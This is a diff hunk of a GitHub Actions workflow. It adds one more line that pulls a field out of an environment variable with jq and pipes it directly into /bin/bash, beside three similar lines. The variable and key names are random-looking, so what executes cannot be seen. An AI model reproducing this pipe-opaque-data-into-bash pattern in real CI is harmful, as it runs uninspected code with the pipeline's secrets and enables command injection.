@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$smc6" | jq -r .lto2449 | /bin/bash
           printf '%s' "$qnf450" | jq -r .eks9066 | /bin/bash
           printf '%s' "$k01760" | jq -r .sb76 | /bin/bash
+          echo $knuj1 | jq -r .k59 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
